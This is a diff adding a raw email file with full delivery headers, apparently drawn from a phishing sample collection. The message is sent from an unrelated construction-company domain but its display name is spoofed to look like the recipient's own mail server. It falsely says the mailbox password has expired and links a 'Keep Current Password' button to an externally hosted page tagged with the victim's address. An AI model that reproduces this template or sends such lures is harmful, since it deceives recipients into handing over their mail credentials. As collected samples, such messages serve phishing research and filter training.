@@ -1,0 +1,121 @@
+Return-Path: xinfoadminx@orientalpacificconstruction.com
+Delivered-To: jose@monkey.org
+X-FDA: 81759310248.19.5FBC708
+Received: from jupiter-cp-sf-nl.nvme-servers.com
+ (jupiter-cp-sf-nl.nvme-servers.com [31.41.249.29])	by imf30.b.hostedemail.com
+ (Postfix) with ESMTP id 227B7180023	for <jose@monkey.org>; Mon,  5 Feb 2024
+ 23:16:01 +0000 (UTC)
+Authentication-Results: imf30.b.hostedemail.com;	dkim=pass
+ header.d=orientalpacificconstruction.com header.s=default header.b=sQtGuYzT;
+	spf=pass (imf30.b.hostedemail.com: domain of
+ xinfoadminx@orientalpacificconstruction.com designates 31.41.249.29 as
+ permitted sender) smtp.mailfrom=xinfoadminx@orientalpacificconstruction.com;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1707174962;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=NLVp36XhnMMnjRwjjNV/F4yCWlEukW306TrkkBUkI/E=;
+	b=6GxXp5JtRPIgY6zmOG/rCjkvLZ7XAwsfP3vWy58AetT+9cPpldfAJ5ugJjiq7KFU/Go+GS
+	T1aS39i8XzrH/BjJxD0fuaGywQz/BCbDk38vyQW+RttSahwlA+hbESQDQ3+8mI1G1FeHcF
+	RsC2bGM+9NmPGYFBanb+Gn8CDDOSFUU=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1707174962; a=rsa-sha256;
+	cv=none;
+	b=nOfo3PRmeunphCtTTzGF7Av84dXKwf2gf8yCfVxlfY9B/hQZrgYmulbmOXAYUJ6y3PIBle
+	CqyJ9I5qDEy7uxbTjBU45cWmh5kUS32h/PaUWPum8bSqPOekazdFStbhHp2ndYjigs9Lhd
+	+2Ohmy/NuHVdaj9rNXrsU57vEck2sck=
+ARC-Authentication-Results: i=1;	imf30.b.hostedemail.com;	dkim=pass
+ header.d=orientalpacificconstruction.com header.s=default header.b=sQtGuYzT;
+	spf=pass (imf30.b.hostedemail.com: domain of
+ xinfoadminx@orientalpacificconstruction.com designates 31.41.249.29 as
+ permitted sender) smtp.mailfrom=xinfoadminx@orientalpacificconstruction.com;
+	dmarc=none
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=orientalpacificconstruction.com; s=default; h=Content-Transfer-Encoding:
+	Content-Type:MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:
+	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
+	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
+	List-Help:List-Unsubscribe:List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=NLVp36XhnMMnjRwjjNV/F4yCWlEukW306TrkkBUkI/E=; b=sQtGuYzTNvMpFU3T5YeCSIfMRm
+	JoE5uEAignj3EhHfiP/KmlUpNpoGUlAURHlPi+MtcTNfWnJWBVLwWf3VORpGMtnsQNruf0JqHogY5
+	CK1n2Iy+U4WQ+ctcmT9qqTKGBJ9zKxSaiwx82gm1dNF51SrJEjsTFdR8sCU06IqsB4fSZzpiuFSHU
+	qKEFhiPiVPqR8CtFjXfhXDxJ3VI6tNnMfPjqRmgAgaUumcGYjbzzatKiLepxXkQCMom3/OZ2Q0S9W
+	GPMNRwE+75mEL/5pSuWEjWgqN+Ib2Jl5kKrXaDgoIwaZBFP6EZAhhQ1CLFjsTEOWZ52deGVqFejnm
+	UbZlb4/Q==;
+Received: from [103.114.105.208] (port=55284
+ helo=orientalpacificconstruction.com)	by jupiter-cp-sf-nl.nvme-servers.com
+ with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384	(Exim
+ 4.96.2)	(envelope-from <xinfoadminx@orientalpacificconstruction.com>)	id
+ 1rX8C0-006RI5-2s	for jose@monkey.org;	Mon, 05 Feb 2024 23:16:00 +0000
+From:
+ =?utf-8?q?=C2=A0?=monkey.org  <xinfoadminx@orientalpacificconstruction.com>
+To: jose@monkey.org
+Subject: Password Expiration Notification
+Date: 05 Feb 2024 15:16:01 -0800
+Message-ID: <20240205151601.64F8BF7A2B1685FE@orientalpacificconstruction.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-AntiAbuse:
+ This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - jupiter-cp-sf-nl.nvme-servers.com
+X-AntiAbuse: Original Domain - monkey.org
+X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
+X-AntiAbuse: Sender Address Domain - orientalpacificconstruction.com
+X-Get-Message-Sender-Via: jupiter-cp-sf-nl.nvme-servers.com: authenticated_id:
+ xinfoadminx@orientalpacificconstruction.com
+X-Authenticated-Sender: jupiter-cp-sf-nl.nvme-servers.com:
+ xinfoadminx@orientalpacificconstruction.com
+X-Source: 
+X-Source-Args: 
+X-Source-Dir: 
+X-Rspamd-Server: rspam06
+X-Rspamd-Queue-Id: 227B7180023
+X-Stat-Signature: kr1z681grdqrjz1ocnhupd4i7urn5d1x
+X-Rspam-User: 
+X-Spam-Status: No, score=4.80
+X-HE-Tag: 1707174961-547273
+X-HE-Meta: =?utf-8?q?U2FsdGVkX199JStta9ocjvkq2VHJKjZuGVpwakPXDjdNtxomquzlkFM?=
+ =?utf-8?q?t9oIUUMKKkifuIKrtFeLkxuwJkynVLs7+kFfbECUcA5gyrgxmt/ups9+gWVVdDBUu?=
+ =?utf-8?q?GSfmHJ/Z+mwJ3Orw6GI9MKGuERDJPlv2MhYk0ujI+EvIxkoLF1VkXJ4c43JGHNm6T?=
+ =?utf-8?q?Bi1BlDhbTYq1VNX84SHLCbLNjoIWWvW+9y2ekwPTxwrOGeUI47uQuZd2s1QCxBvJD?=
+ =?utf-8?q?yYHs/5GDdcaI4kmQB1rHj5K3wvUrZxbLMLCHBZPIUeWFlSXPM6F+XrHkOMJlpOnns?=
+ =?utf-8?q?rx3LUSUM+ZMpx7BvDm/bBe4ESiJnn4q9gBqV4O3O+/U9xv+o=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 46
+
+<p align=3D"center">The password to your mailbox <b><font color=3D"#000080"=
+>
+jose@monkey.org</font></b> has expired.</p>
+<p align=3D"center">To keep using your current password, kindly use the but=
+ton=20
+below.</p>
+<p align=3D"center">
+<span style=3D"border: 0px; font-style: inherit; font-variant: inherit; fon=
+t-weight: inherit; font-stretch: inherit; font-size: 16px; line-height: 1.5=
+; font-family: inherit; font-optical-sizing: inherit; font-kerning: inherit=
+; font-feature-settings: inherit; font-variation-settings: inherit; margin:=
+ 0px; padding: 0px 20px; vertical-align: baseline; color: inherit; box-sizi=
+ng: border-box; letter-spacing: normal; display: inline-block;">
+<a target=3D"_blank" rel=3D"noreferrer noopener" data-auth=3D"NotApplicable=
+" data-linkindex=3D"0" style=3D"border: 1px solid rgb(138, 59, 143); font-s=
+tyle: inherit; font-variant: inherit; font-weight: 700; font-stretch: inher=
+it; font-size: inherit; line-height: inherit; font-family: Tahoma, Verdana,=
+ Segoe, sans-serif; font-optical-sizing: inherit; font-kerning: inherit; fo=
+nt-feature-settings: inherit; font-variation-settings: inherit; margin: 0px=
+; padding: 5px 0px; vertical-align: baseline; border-radius: 4px; width: au=
+to; text-align: center; color: rgb(255, 255, 255); text-decoration: none; d=
+isplay: inline-block; box-sizing: border-box; background-color: rgb(0, 2, 1=
+65);" href=3D"https://pub-f608d73b608c4b20b8eb9f90c96412ee.r2.dev/obureee.h=
+tml#jose@monkey.org">Keep Current Password</a></span></p>
+<p align=3D"center"><span style=3D"letter-spacing: normal">
+<font face=3D"Tahoma, Verdana, Segoe, sans-serif" style=3D"background-color=
+: #FFFFFF" size=3D"1">
+Email is generated by&nbsp;monkey.org Email Server for jose@monkey.org</fon=
+t></span></p>
+
